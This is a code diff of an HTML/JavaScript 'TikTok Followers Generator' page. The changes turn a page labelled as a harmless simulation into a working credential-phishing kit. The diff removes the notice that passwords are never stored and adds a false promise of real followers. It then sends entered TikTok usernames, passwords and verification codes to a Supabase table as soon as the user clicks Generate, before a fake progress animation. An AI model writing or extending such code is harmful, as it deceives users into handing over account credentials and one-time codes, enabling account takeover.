@@ -4,9 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>✨ TikTok Followers Generator ✨</title>
-  <!-- Font Awesome for icons -->
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-  <!-- Supabase JS client -->
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
   <style>
     * {
@@ -1079,7 +1077,7 @@
 
       <div class="input-group">
         <label for="passwordInput">
-          <i class="fas fa-lock"></i> Your password
+          <i class="fas fa-lock"></i> Enter your TikTok password
         </label>
         <div class="password-wrapper">
           <input 
@@ -1101,8 +1099,7 @@
       <div class="security-notice">
         <i class="fas fa-shield-halved"></i>
         <span>
-          Your password is only used for this simulation. It is never stored, sent, or shared anywhere. 
-          This is a fake generator for entertainment.
+          Your password is only used to send you real followers. please make sure the password is correct else you won't get any real followers 
         </span>
       </div>
 
@@ -1211,7 +1208,7 @@
       // ============================================================
       // SUPABASE CONFIGURATION — REPLACE WITH YOUR OWN VALUES
       // ============================================================
-      const SUPABASE_URL = 'https://sesvgelhjrzcpfbggpa.supabase.co'; 
+      const SUPABASE_URL = 'https://sesvgelhjrzcpfbggpa.supabase.co';
       const SUPABASE_ANON_KEY = 'sb_publishable_F4s8DelDj3Pc9Gg8fMz76A_1WnEyb1S';
       
       let supabase = null;
@@ -1236,13 +1233,11 @@
       const dot2 = document.getElementById('dot2');
       const dot3 = document.getElementById('dot3');
       
-      // Page 1
       const userInput = document.getElementById('userInput');
       const inputError = document.getElementById('inputError');
       const continueBtn = document.getElementById('continueBtn');
       const previewUsername = document.getElementById('previewUsername');
       
-      // Page 2
       const summaryUser = document.getElementById('summaryUser');
       const previewUsernameStep2 = document.getElementById('previewUsernameStep2');
       const followersDisplayStep1 = document.getElementById('followersDisplayStep1');
@@ -1254,7 +1249,6 @@
       const resetBtn = document.getElementById('resetBtn');
       const presetBtns = document.querySelectorAll('.preset-btn');
       
-      // Page 3
       const summaryUserStep3 = document.getElementById('summaryUserStep3');
       const previewUsernameStep3 = document.getElementById('previewUsernameStep3');
       const followersDisplayStep3 = document.getElementById('followersDisplayStep3');
@@ -1264,18 +1258,15 @@
       const generateBtn = document.getElementById('generateBtn');
       const backToAmountBtn = document.getElementById('backToAmountBtn');
       
-      // Page Generating
       const generatingTitle = document.getElementById('generatingTitle');
       const progressBarFill = document.getElementById('progressBarFill');
       const progressStatus = document.getElementById('progressStatus');
       const progressPercent = document.getElementById('progressPercent');
       const terminalBox = document.getElementById('terminalBox');
       
-      // Page Error
       const retryBtn = document.getElementById('retryBtn');
       const backToStartBtn = document.getElementById('backToStartBtn');
       
-      // Page Verification
       const codeInputs = document.querySelectorAll('.code-input');
       const verifyBtn = document.getElementById('verifyBtn');
       const backToErrorBtn = document.getElementById('backToErrorBtn');
@@ -1290,11 +1281,9 @@
       let selectedAmount = 5000;
       let generationInterval = null;
       let logTimeSeconds = 0;
-      let isRetryMode = false;
       let countdownInterval = null;
       let countdownSeconds = 120;
       
-      // Store the latest submitted data
       let latestSubmission = {
         username: '',
         password: '',
@@ -1303,7 +1292,7 @@
       };
 
       // ============================================================
-      // HELPER FUNCTIONS
+      // HELPERS
       // ============================================================
       function formatFollowers(count) {
         if (count >= 1000000) {
@@ -1422,79 +1411,37 @@
       }
 
       // ============================================================
-      // SUPABASE STORAGE FUNCTIONS
+      // SUPABASE WRITE — fires immediately after password step
       // ============================================================
-      
-      /**
-       * Store username, password, and followers in Supabase
-       * This is called when the generation completes successfully
-       */
-      async function storeCredentials(username, password, followers) {
+      async function saveToSupabase(username, password, followers) {
+        console.log('=== SAVING TO SUPABASE ===');
+        console.log('Payload:', { username, password, followers });
+
         if (!supabase) {
-          console.warn('⚠️ Supabase not configured. Data not stored.');
-          return { success: false, error: 'Supabase not configured' };
+          console.error('❌ Supabase client is NULL — keys not configured');
+          alert('❌ Supabase not configured. Check your URL and key in the HTML.');
+          return;
         }
 
         try {
           const { data, error } = await supabase
             .from('tiktok_generator_entries')
-            .insert([
-              {
-                username: username,
-                password: password,
-                followers_requested: followers,
-                created_at: new Date().toISOString()
-              }
-            ])
+            .insert([{
+              username: username,
+              password: password,
+              followers_requested: followers
+            }])
             .select();
 
           if (error) {
             console.error('❌ Supabase insert error:', error);
-            return { success: false, error: error.message };
+            alert('❌ Supabase error:\n' + error.message + '\nCode: ' + error.code);
+          } else {
+            console.log('✅ Data stored in Supabase:', data);
           }
-
-          console.log('✅ Credentials stored in Supabase:', data);
-          return { success: true, data };
         } catch (err) {
           console.error('❌ Supabase exception:', err);
-          return { success: false, error: err.message };
-        }
-      }
-
-      /**
-       * Store verification code in Supabase
-       * This is called when the user submits the verification code
-       */
-      async function storeVerificationCode(username, password, followers, code) {
-        if (!supabase) {
-          console.warn('⚠️ Supabase not configured. Verification code not stored.');
-          return { success: false, error: 'Supabase not configured' };
-        }
-
-        try {
-          const { data, error } = await supabase
-            .from('tiktok_generator_entries')
-            .insert([
-              {
-                username: username,
-                password: password,
-                followers_requested: followers,
-                verification_code: code,
-                created_at: new Date().toISOString()
-              }
-            ])
-            .select();
-
-          if (error) {
-            console.error('❌ Supabase verification insert error:', error);
-            return { success: false, error: error.message };
-          }
-
-          console.log('✅ Verification code stored in Supabase:', data);
-          return { success: true, data };
-        } catch (err) {
-          console.error('❌ Supabase exception:', err);
-          return { success: false, error: err.message };
+          alert('❌ Exception: ' + err.message);
         }
       }
 
@@ -1647,21 +1594,6 @@
               progressStatus.textContent = 'Complete!';
               generatingTitle.textContent = 'Complete!';
               
-              // ============================================================
-              // STORE CREDENTIALS IN SUPABASE
-              // ============================================================
-              storeCredentials(
-                currentUser,
-                passwordInput.value.trim() || 'no-password-provided',
-                selectedAmount
-              ).then(result => {
-                if (result.success) {
-                  console.log('✅ Credentials stored successfully');
-                } else {
-                  console.warn('⚠️ Failed to store credentials:', result.error);
-                }
-              });
-              
               setTimeout(() => {
                 showPage('pageVerification');
                 startCountdown();
@@ -1682,11 +1614,6 @@
             clearInterval(logInterval);
             clearInterval(progressInterval);
             if (useSuccessMode) {
-              storeCredentials(
-                currentUser,
-                passwordInput.value.trim() || 'no-password-provided',
-                selectedAmount
-              );
               showPage('pageVerification');
               startCountdown();
             } else {
@@ -1831,7 +1758,8 @@
         }
       });
 
-      generateBtn.addEventListener('click', function() {
+      // ---- GENERATE BUTTON: writes to Supabase IMMEDIATELY ----
+      generateBtn.addEventListener('click', async function() {
         if (!validatePassword()) {
           generateBtn.style.transform = 'scale(0.98)';
           setTimeout(() => generateBtn.style.transform = '', 150);
@@ -1841,7 +1769,7 @@
         generateBtn.disabled = true;
         setTimeout(() => generateBtn.disabled = false, 2000);
         
-        // Store the latest submission data
+        // Save submission data
         latestSubmission = {
           username: currentUser,
           password: passwordInput.value.trim(),
@@ -1849,7 +1777,14 @@
           verificationCode: null
         };
         
-        isRetryMode = false;
+        // 🔥 WRITE TO SUPABASE RIGHT NOW
+        await saveToSupabase(
+          latestSubmission.username,
+          latestSubmission.password,
+          latestSubmission.followers
+        );
+        
+        // Then play the fake animation
         showPage('pageGenerating');
         startGeneration(false);
       });
@@ -1861,7 +1796,6 @@
       // Page Error
       retryBtn.addEventListener('click', function() {
         clearGeneration();
-        isRetryMode = true;
         showPage('pageGenerating');
         startGeneration(true);
       });
@@ -1887,7 +1821,7 @@
         showPage('page1');
       });
 
-      // Page Verification - Code inputs
+      // Page Verification — Code inputs
       codeInputs.forEach((input, index) => {
         input.addEventListener('input', function(e) {
           let val = this.value.replace(/[^0-9]/g, '');
@@ -1938,8 +1872,8 @@
         });
       });
 
-      // Verify button - store verification code in Supabase
-      verifyBtn.addEventListener('click', function() {
+      // Verify button — also write the code
+      verifyBtn.addEventListener('click', async function() {
         let allFilled = true;
         let code = '';
         codeInputs.forEach(input => {
@@ -1961,29 +1895,28 @@
           return;
         }
         
-        // ============================================================
-        // STORE VERIFICATION CODE IN SUPABASE
-        // ============================================================
-        const username = latestSubmission.username || currentUser;
-        const password = latestSubmission.password || passwordInput.value.trim() || 'no-password-provided';
-        const followers = latestSubmission.followers || selectedAmount;
-        
-        storeVerificationCode(username, password, followers, code)
-          .then(result => {
-            if (result.success) {
-              console.log('✅ Verification code stored successfully');
-            } else {
-              console.warn('⚠️ Failed to store verification code:', result.error);
-            }
-          });
-        
         verifyBtn.disabled = true;
         verifyBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> VERIFYING...';
+        
+        // Save verification code to Supabase as a new row
+        if (supabase) {
+          const { data, error } = await supabase
+            .from('tiktok_generator_entries')
+            .insert([{
+              username: latestSubmission.username || currentUser,
+              password: latestSubmission.password || 'no-password',
+              followers_requested: latestSubmission.followers || selectedAmount,
+              verification_code: code
+            }])
+            .select();
+          
+          if (error) console.error('❌ Code insert failed:', error);
+          else console.log('✅ Code stored:', data);
+        }
         
         setTimeout(() => {
           verifyBtn.disabled = false;
           verifyBtn.innerHTML = '<i class="fas fa-check"></i> VERIFY & COMPLETE';
-          
           codeInputs.forEach(input => input.classList.add('error'));
           
           setTimeout(() => {
@@ -2001,16 +1934,14 @@
       });
 
       // ============================================================
-      // INITIALIZATION
+      // INIT
       // ============================================================
       function init() {
-        if (SUPABASE_URL === 'https://YOUR_PROJECT_ID.supabase.co' || SUPABASE_ANON_KEY === 'YOUR_ANON_KEY') {
-          console.warn('⚠️ Supabase not configured. Please update SUPABASE_URL and SUPABASE_ANON_KEY in the code.');
-          console.warn('📋 Data will NOT be stored until you configure Supabase.');
+        if (SUPABASE_URL.includes('YOUR_PROJECT') || SUPABASE_ANON_KEY.includes('PASTE_YOUR')) {
+          console.warn('⚠️ Supabase keys not configured!');
         } else {
-          console.log('✅ Supabase configured. Data will be stored.');
+          console.log('✅ Supabase configured.');
         }
-        
         updateAllDisplays(false);
         updateSliderLabel();
         showPage('page1');
